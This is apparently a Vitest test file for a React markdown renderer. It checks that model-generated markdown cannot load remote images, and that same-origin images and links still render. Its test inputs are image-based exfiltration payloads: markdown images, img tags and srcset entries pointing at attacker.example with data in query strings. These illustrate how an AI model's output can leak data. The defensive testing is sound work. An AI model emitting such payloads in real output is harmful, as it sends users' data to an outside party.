import { afterEach, describe, expect, it } from "vitest";
import { cleanup, render, screen } from "@testing-library/react";
import { StreamMarkdown } from "./StreamMarkdown";

// sc-157 (QA SEC-003): model markdown must never make the browser fetch a remote image.

afterEach(cleanup);

function images(container: HTMLElement): string[] {
  return Array.from(container.querySelectorAll("img")).map((img) => img.getAttribute("src") ?? "");
}

describe("StreamMarkdown images", () => {
  it.each([
    ["markdown image", "Look: ![secret](https://attacker.example/x.png?q=raid-data)"],
    ["protocol-relative image", "![secret](//attacker.example/x.png)"],
    ["raw html image", 'Look: <img src="https://attacker.example/x.png?q=1" alt="secret">'],
  ])("blocks a remote %s", (_label, md) => {
    const { container } = render(<StreamMarkdown content={md} />);
    expect(images(container).filter((src) => /^(https?:)?\/\//.test(src))).toEqual([]);
    expect(container.innerHTML).not.toContain("attacker.example");
    expect(screen.getByText(/Image blocked: secret/)).toBeTruthy();
  });

  it.each([
    [
      "picture/source srcset (QA BUG-001)",
      '<picture><source srcset="https://attacker.example/x.png?q=SECRET"><img src="/favicon.ico" alt="a"></picture>',
    ],
    ["img srcset", '<img src="/favicon.ico" srcset="https://attacker.example/x.png 2x" alt="a">'],
  ])("drops a remote %s", (_label, md) => {
    for (const streaming of [false, true]) {
      const { container, unmount } = render(<StreamMarkdown content={md} streaming={streaming} />);
      expect(container.innerHTML).not.toContain("attacker.example");
      expect(container.querySelector("source, [srcset]")).toBeNull();
      // While streaming the text inks in gradually, so the image may not be shown yet.
      if (!streaming) expect(images(container)).toEqual(["/favicon.ico"]);
      unmount();
    }
  });

  it("blocks an image with a non-http scheme", () => {
    const { container } = render(<StreamMarkdown content="![x](ftp://attacker.example/x.png)" />);
    expect(container.innerHTML).not.toContain("attacker.example");
    expect(container.querySelector("img")).toBeNull();
  });

  it("blocks a remote image while streaming too", () => {
    const { container } = render(
      <StreamMarkdown content="![x](https://attacker.example/x.png)" streaming />,
    );
    expect(container.innerHTML).not.toContain("attacker.example");
  });

  it("still renders same-origin images", () => {
    const { container } = render(
      <StreamMarkdown content={`![a](/static/chart.png)\n\n![b](${window.location.origin}/c.png)`} />,
    );
    expect(images(container)).toEqual(["/static/chart.png", `${window.location.origin}/c.png`]);
  });

  it("keeps ordinary links clickable in a new tab", () => {
    render(<StreamMarkdown content="[report](https://www.warcraftlogs.com/reports/abc)" />);
    const link = screen.getByRole("link", { name: "report" });
    expect(link.getAttribute("href")).toBe("https://www.warcraftlogs.com/reports/abc");
    expect(link.getAttribute("target")).toBe("_blank");
  });
});
